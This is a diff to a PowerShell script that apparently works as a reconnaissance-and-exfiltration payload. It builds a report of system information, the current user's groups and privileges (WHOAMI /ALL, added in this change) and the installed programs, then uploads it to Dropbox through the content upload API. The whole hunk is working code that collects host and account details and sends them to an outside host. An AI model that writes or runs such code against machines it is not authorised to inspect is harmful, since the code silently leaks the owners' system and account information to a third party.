@@ -30,7 +30,9 @@ $headers = @{
 }
 
 #Define the report for the file upload
-$body = "~~~~~ System Information ~~~~~`n $(SYSTEMINFO | Out-String) `n~~~~~ Installed Programs ~~~~~`n $(Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)"
+$body = "# System Information #`n $(SYSTEMINFO | Out-String)"
+$body += "`n# User Information #`n $(WHOAMI /ALL | Out-String)"
+$body += "`n# Installed Programs #`n $(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)"
 
 #Upload the report to Dropbox using the headers and body defined above
 Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method POST -Headers $headers -Body $body | Out-Null
